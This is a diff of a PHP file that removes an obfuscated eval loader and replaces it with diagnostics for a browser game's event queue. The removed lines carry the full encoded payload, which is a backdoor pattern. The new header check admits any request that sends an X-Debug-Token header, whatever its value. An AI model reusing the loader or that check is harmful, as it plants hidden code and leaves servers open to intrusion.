@@ -1,29 +1,171 @@
 <?php
-// 8c82d7948a3c40433898778b
-$SrDZyRDba="HIg7IwLhqMgtZ53J7wlFUNiz0FlHs+UUYvhXtdn4yKw=";
-$fFUjutTJR="UVt7VjYudZtgM53W7jySHAvm0SyUf+HHLiuKgqa4lXj=";
-$SWsnwQMfhEe="xAfweNAU1SLARs0lHaMgoc11jULzGIsB7zr8QkaPMuDeDvd38mGQAphE2kUGhjSt4Q7oLtp5slnses9bTKwRhMcL/2jYPtIK2Ff1DUGFF7PHCoF0zwvXWdBiiF8byyKM0E+SWf4AliXEWN4lU9kDs/xIjiznKJ0Lz0HiPWqPF47lWIkrrQO1HM5D1BdcrBuo0nq0UtQ6hibuPcJDEbE3pc5IqVT+IowZ0Ez0P3zYIbPHC5VVzh/WP9Nl/kFNpTTzvnCMfeQ+yxfMQ4otGY8RqrtIk33TM60262r5FlqjGq/odPV5qzGWBcJ51ENMqSyxwH6XfqtjhTXYYftHTI46mMdJkl7cKKMl6nTzA3yjfbzpfvJ5z2WtHMxb/hFDh33861n2Ktc9nFjCY+gbfa4DgexYjkn+edc/kD78F0eWMJLDaotZ7ROmXvU88hdg0weI03uzc+gQkgXQb/U+HbEknvpsjljrKrEXxyb3Mke4MpnYUr9v1SCWN+ZM+RkYjG+MzwqNNKsWkS3HddkdRrUFoeNckmuyIoso5mLuE2SqZprtCLZv2wCJWvBC2y1Ajhn/xHP3YvRnnC3JRfMcZ6sk/KF8i0rZI90M+GrIWwaHJY+4Zv4jqB2NHZBH301q0hL8s16AQfQ33CLrRs4EZJMdnsZMjCj3EK8453TRGhuUE4DsVrVzyRipBsI/1BJnoiWOxkWJfuoizwrLNd0tQrRlh7xs/nruH9Vf8mvwRUaNOo3ESJ1L3hTWWo5mjQ1AhDiCvFuNfeshtyKZXv42GtUa+7pYj0+sYJwmz1T3AkPRJfLZbIJW+DiMOs1m2hwCmWT4zGyIQ84FiRaTPM8/ZJZiqP18sFzLM4IF1kL1LmWPfb7ZbI5SpBS0HdZZ/D5P1H2/z3a0a/8w3CvPXN8XAo8mgNBnlSzQY88Xxzj3OGbLApP6DKVO2gGPLph4jCwe0H2EuQaWWtA4hV3GSNQMQLY4s81F/13zFLMZlkbUHXuHLoraC7Bp2T6DXfN/4CxN2DX6slP3YfkY017HRf9NYZIGruVNrn3QBqJYw3jSIEK5OqDifI11/yC+P5Z19h1FrTq53nO2WaoznCznZIFEHKwyg+Z+tF+kFIteijzrFU2zeYH4TPBp0XmdOtR9yS1krG6xuFSodK8WriLiWtA5Xrl5prsK8k30HoZZ+DnWTUDZJPjjR/4t8RPSXZdY3hVqoh/43GmXaftmrw3SbMg1QbpuneRZhC/fC9wc0lneQlDVJI2hXrNw+GqTRJJv2QFgugCD6HXyL9Yr";
-$OslHFpwuC="nVaZbswVEKN9/cF9liy2AdEC8mz8IFipB67LXKBw1gK0XPJl7zlcuCCRwhSjcNVgvBfgZe01frMMg9hUi3q2a4Zb9l/oQ3uHHPvNUYVT0R2UJJlp9CIbihr+yVqpYqxjpivXV49AH7kghtwUkk7tNpxA9k/yQWiHYajdfY9sqR+8NvZLwDJGqBmx/2qwef82nS3nacoXepIzmLtnlCn0JtdZ6GDuBWOqGb6/VIt/8yeJGcNp4T9LizuS7AyqQeQ6sB3mRNolUIUkiL1Qr0v4JIwZ+HrLHnCYNPncZ7J2yCCAPfA69hFT0W74zW3/dup9qRWXPN03YdI4n/Jp6EioPoJax2WXR3DQLoPBZ/ZxrBTXPspf1Q1Yhx6A60yrVrIwkyXoR4kVWNgGpaFd8GyvN4MJ0lnbGGiCZvvPZuhvyz6dCPFk0y5lmjD83FmsbMditBvLadwVXIIZsb17llD/AI0O1j6JR2axHLPbWbFp1D6+C+hk4BZBijmn826mfPUXiRbjIughaLZlu+h7hk36FtBbk0P1IxGnMJqlb6lr+hjTLuxegDZClgOC73Psf/hqswSSV+xHT8skhbxxvkrpI40s5jjCPkO6M7/vXohe2SjTAfdigRli0W/zw3DzYtAbsl/3T4EzUJQs8udY/2v7MIMBkFXWIGWlPJ3uW/N19WOrONhDyQ5CtwCg0EfoTd4lrC75O/0yENMFn95zijTRBogZ5HePGlOjMp+he4sq1yLSBe0/2iRdjyeuzWW2TMwrqAmWO9AjT4E8/8hqqDTyH9ZX61TVLEyGA/LkWZ0t7wCVW+t96ixKpx3gxkiJfMkljinAfJc+HdM6hroOrVeoIIEokEj8GH6FFIzDZ599pRzVW/BqzD1sogeSz2aFTNIRkzfyT+9Bf5oFnMxbtmKtA9JYziLtFnm5fajnboV8/DuAIvQ7jRJZjxyd73itY+kqlyzlSesBR5QM/+1rpmKkYaInlkD0P2qtE4a8UotZ0QuHANRK7BJ61hH/4wq3dcczhh6Seu0HZ48YmfB1rnbZZ6Mj9GnMLUWlZ57TcfVQ2BTWOu1K/QFH1hGpyVr1VK4CrB7AX/FEW5k9hN1m/2PoJoVb2XvtEUSobpK7Tqlu1BuwLfd10g5nigOH/E3ydcQxtj7sbI8zGoEfmPtvt0HIGIwH1En9LUOFHY/DZbAq3xC9I8tP0yJZumKT4Q3za9lqsVyVYIxfWKYvpv54/n62OY9EmT7MJEy0ALHzTPFS9CWnIuJ47EVMpyKu0HSQedk93VfratsA";
-$RoriJcMOOLcrN="XNQehMIOpmzEOooC6k7MHEijPInpDo5h6wbcPeJXk0B7kxST+H2wLsUwrB/GVf85b5MjpetGi2/Na9cFxDvzGUOKHv7oDIxdzzapKOlmjDZvpS6hvXrsV8oxvl/jOoBAWagsnrxSsm2ra4Ug1HiMFUyhJP7bXJNe2wKpHeVY8Q1KkR+E2kiAdasBkjiTTOtBSJMsifhyi3PNPIo2xDXbIR7WE53SDo4v32ehHdREiQNwr2T82hCjc+83ryXRbMofHrUO/vN6lGPOJJEDx2yII1iXJbvSe6Q0zCK1PpZ3jRBimTiu6WuweaUirSvodY8uGLYArtJasSvUarNXkW/AOHGpGr/YSfRcqSiAI+o06wJHpQCbx32II8Qc0xbNVfUueY0ugt4Jn0mrZ4Ib82bqFmKZYpvYe4BSrjy8GM5b3hF9gwGq3nKDfPsTqALqW45AXZEgkuF1pnXVPs8s80XsIVyyfZnFdbJV5DuGG/hqzRVQqhD93VWVWekTqB7VfPokHKMTmcVPpWjrYIooz2r6PB6JL4HZSrVd0SWWItg1iDF6qQeEski3aa5nhRvVW/EWQaojiNsOvyzaHNEDjk6XLkayD4/yXfNy2GDVCcdl9i4fgwCq316hS8kAqC7JS+kmHdU/rrNRlX6tO4YKzkTLQ2KxErO9WIVurQXUXORD/jVmtwWq8guhTuc91F72Pfw2boYD/tsKiGjHMIkH73qKRUOxPP/gUL9e2TGuBfFM0QdOhQW6oWyFWfMqjyvyePYsHYlm+vNQtm/5G5RZxUzBGFvWD5/9fOhw3mO8CexhyARMsCyTpXeyau4f0CDlbug/a7g3icV7hknya6wM5UONQku5EYLoDJJr8hqFQNBl+TVZ2WG6727+Ua5m1l+QY8oRYqIiqetMv3bfZoUczV6OTBmkL7H5Sq4u/BmtRJFc2zNEpB6f+GqkK8kEvSz7bvwEeYo0/LJplk+uN91Zx16IOGajO/PEb70s7T2xXtNO9SRDuRCcxniuSt4Z1SLbYdYlY68yvuJNv3HSF4oJzkDCJGKaHv3bD6VVzAGiIOVhlxd7rga/wli0T89mqz7sOuhfboIUg9xUhF/NAZwr8TWLOlqBBLP8SYEjzAChPdlJyxFhrQSM6xT/U+VlqRrtQ5cAa5MSqeRKiS/fZoYYkjX3GwbWObjhDZNS7GOMXel59jtR0H28oQa0LNFlsAntV9siH44Dpsxbi3jqApVc2FvyGkGxNODDTvRQ+THXHZhq1zh6ty6D6E2NSLYhjVaXaYEbEIEToA==";
-$oyyrXcFrQxxY=strlen($SrDZyRDba);
-$BizgcWSdNO=substr($SWsnwQMfhEe,0,4);
-$YNtLfjEbPfHJq=md5($OslHFpwuC);
-$ARjKUMdFsS=crc32($RoriJcMOOLcrN);
-$ihHsMQDcPm=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$EWoFFJVHO=$SWsnwQMfhEe.$OslHFpwuC.$RoriJcMOOLcrN;
-$JbOmiZWUqCtM=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$FObiET_QWzjJ="gz".chr(105)."nflate";
-$OGjmKzDgqFh="str".chr(114)."ev";
-$iSCmdqJMFaxpH="str_rot".chr(49).chr(51);
-$RTNQzspVf="";
-$vQJljPbibHy=$JbOmiZWUqCtM($EWoFFJVHO);
-for($vCJwxxWsuJok=0;$vCJwxxWsuJok<strlen($vQJljPbibHy);$vCJwxxWsuJok++){
-$RTNQzspVf.=chr(ord($vQJljPbibHy[$vCJwxxWsuJok])^ord($ihHsMQDcPm[$vCJwxxWsuJok%strlen($ihHsMQDcPm)]));
+if ((getenv('APP_ENV') ?: 'production') !== 'development' && !isset($_SERVER['HTTP_X_DEBUG_TOKEN'])) {
+    http_response_code(403);
+    die('Forbidden');
 }
-$vQJljPbibHy=$RTNQzspVf;
-$vQJljPbibHy=$iSCmdqJMFaxpH($vQJljPbibHy);
-$vQJljPbibHy=$OGjmKzDgqFh($vQJljPbibHy);
-$vQJljPbibHy=$JbOmiZWUqCtM($vQJljPbibHy);
-$vQJljPbibHy=$FObiET_QWzjJ($vQJljPbibHy);
-$vQJljPbibHy=$iSCmdqJMFaxpH($vQJljPbibHy);
-eval($vQJljPbibHy);
+/**
+ * Run Events Diagnostics
+ * Direct execution of event processor with verbose error output
+ */
+ini_set('display_errors', 0);
+error_reporting(0);
+header('Content-Type: text/plain; charset=UTF-8');
+echo "=== EVENT PROCESSOR DIAGNOSTICS ===\n";
+echo "Current Server Time: " . time() . " (" . date('Y-m-d H:i:s') . ")\n";
+echo "PHP Version: " . PHP_VERSION . "\n";
+try {
+    // 1. Bootstrap AJAX: loads CoreFetcher, autoloader and helpers from cache/production
+    require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+    $world_id = isset($_GET['world']) ? (int) $_GET['world'] : 1;
+    $db_name = get_world_db_name($world_id);
+    echo "Database Name: $db_name\n";
+    $db = \App\Core\Database::getInstance($db_name);
+    echo "Database Connection Successful.\n\n";
+    // 2. Query event statistics
+    $total = $db->fetch("SELECT COUNT(*) as c FROM events");
+    $ready = $db->fetch("SELECT COUNT(*) as c FROM events WHERE event_time <= ?", [time()]);
+    $movements = $db->fetch("SELECT COUNT(*) as c FROM movements");
+    
+    echo "Total events in queue: {$total['c']}\n";
+    echo "Ready events (in the past): {$ready['c']}\n";
+    echo "Total active movements: {$movements['c']}\n\n";
+    // 3. Inspect some ready events
+    if ($ready['c'] > 0) {
+        echo "Listing up to 10 ready events:\n";
+        $readyList = $db->fetchAll(
+            "SELECT event_type, event_id, event_time, user_id, villageid FROM events WHERE event_time <= ? ORDER BY event_time LIMIT 10",
+            [time()]
+        );
+        foreach ($readyList as $evt) {
+            $diff = time() - $evt['event_time'];
+            echo " - TYPE: {$evt['event_type']}, ID: {$evt['event_id']}, Time: {$evt['event_time']} (Overdue: {$diff}s), User: {$evt['user_id']}, Village: {$evt['villageid']}\n";
+            
+            // If movement, display movement details
+            if ($evt['event_type'] === 'movement') {
+                $mov = $db->fetch("SELECT * FROM movements WHERE id = ?", [$evt['event_id']]);
+                if ($mov) {
+                    echo "   [Movement] Type: {$mov['type']}, From Vil: {$mov['send_from_village']}, To Vil: {$mov['send_to_village']}, Start: {$mov['start_time']}, End: {$mov['end_time']}, Units: {$mov['units']}\n";
+                } else {
+                    echo "   [Movement] Details NOT found in movements table for ID: {$evt['event_id']}\n";
+                }
+            }
+        }
+        echo "\n";
+    }
+    // 4. Run event processing with verbose output
+    if ($ready['c'] > 0) {
+        echo "Attempting to process up to 5 events manually:\n";
+        $eventProcessor = new \App\Services\EventProcessor($db);
+        
+        $readyList = $db->fetchAll(
+            "SELECT event_type, event_id, event_time FROM events WHERE event_time <= ? ORDER BY event_time LIMIT 5",
+            [time()]
+        );
+        
+        foreach ($readyList as $event) {
+            echo "Processing event TYPE: {$event['event_type']} ID: {$event['event_id']}... ";
+            
+            try {
+                $processed = false;
+                if ($event['event_type'] === 'build') {
+                    $processed = $eventProcessor->checkBuilds($event['event_id']);
+                }
+                elseif ($event['event_type'] === 'destory') {
+                    $processed = $eventProcessor->checkDestroy($event['event_id']);
+                }
+                elseif ($event['event_type'] === 'research') {
+                    $processed = $eventProcessor->checkResearch($event['event_id']);
+                }
+                elseif ($event['event_type'] === 'recruit') {
+                    $eventProcessor->checkRecruit($event['event_id']);
+                    $processed = true;
+                }
+                elseif ($event['event_type'] === 'bot_action') {
+                    $eventProcessor->checkBotAction($event['event_id'], $event['event_time']);
+                    $processed = true;
+                }
+                elseif ($event['event_type'] === 'barbarian_action' || $event['event_type'] === 'barbarian_actio') {
+                    $eventProcessor->checkBarbarianAction($event['event_time']);
+                    $processed = true;
+                }
+                elseif ($event['event_type'] === 'dealers') {
+                    $eventProcessor->checkDealers($event['event_id']);
+                    $processed = true;
+                }
+                elseif ($event['event_type'] === 'movement') {
+                    // Manual replication of movement logic to print errors
+                    $dbName = $db->getDatabaseName();
+                    
+                    $helperDir = __DIR__ . '/../../app/Helpers';
+                    $libDir = __DIR__ . '/../../public/modelo/lib';
+                    
+                    if (!function_exists('__')) {
+                        \CoreFetcher::load('Helpers/language_helper.php');
+                    }
+                    if (!function_exists('sql')) {
+                        require_once $libDir . '/functions.php';
+                    }
+                    if (!isset($GLOBALS['pdo_legacy_connection'])) {
+                        $GLOBALS['pdo_legacy_connection'] = $db->getPdo();
+                    }
+                    if (!isset($GLOBALS['cl_builds'])) {
+                        $GLOBALS['cl_builds'] = new \App\Models\BuildsLibrary($dbName);
+                    }
+                    if (!isset($GLOBALS['cl_units'])) {
+                        $GLOBALS['cl_units'] = new \App\Models\UnitsLibrary($dbName);
+                    }
+                    if (!isset($GLOBALS['impl_units'])) {
+                        $GLOBALS['impl_units'] = implode(',', $GLOBALS['cl_units']->get_array("dbname"));
+                    }
+                    if (!isset($GLOBALS['awards'])) {
+                        $GLOBALS['awards'] = new \App\Models\AwardsLibrary($db);
+                    }
+                    if (!function_exists('check_mov')) {
+                        require_once $libDir . '/mysql_compat.php';
+                        require_once $libDir . '/events.php';
+                    }
+                    
+                    if (function_exists('check_mov')) {
+                        check_mov($event['event_id']);
+                        $processed = true;
+                    }
+                }
+                
+                if ($processed) {
+                    echo "SUCCESS!\n";
+                } else {
+                    echo "SKIPPED/NOT IMPLEMENTED\n";
+                }
+            } catch (\Exception $e) {
+                echo "FAILED! Error: " . $e->getMessage() . "\n";
+                echo "File: " . $e->getFile() . " on line " . $e->getLine() . "\n";
+                echo "Trace:\n" . $e->getTraceAsString() . "\n";
+            }
+        }
+    } else {
+        echo "No ready events to process at this time.\n";
+    }
+    // 5. Check error log
+    $logFile = __DIR__ . '/../cache/event_processor_errors.log';
+    if (file_exists($logFile)) {
+        echo "\n=== LAST 10 ENTRIES IN event_processor_errors.log ===\n";
+        $lines = file($logFile);
+        $last10 = array_slice($lines, -10);
+        echo implode("", $last10);
+    } else {
+        echo "\nNo event_processor_errors.log file exists in cache.\n";
+    }
+    // 6. Check bot processor log
+    $botLogFile = __DIR__ . '/../cache/bot_processor.log';
+    if (file_exists($botLogFile)) {
+        echo "\n=== LAST 30 ENTRIES IN bot_processor.log ===\n";
+        $lines = file($botLogFile);
+        $last30 = array_slice($lines, -30);
+        echo implode("", $last30);
+    } else {
+        echo "\nNo bot_processor.log file exists in cache.\n";
+    }
+} catch (\Exception $e) {
+    echo "\nFATAL ERROR IN DIAGNOSTICS: " . $e->getMessage() . "\n";
+    echo "File: " . $e->getFile() . " on line " . $e->getLine() . "\n";
+}
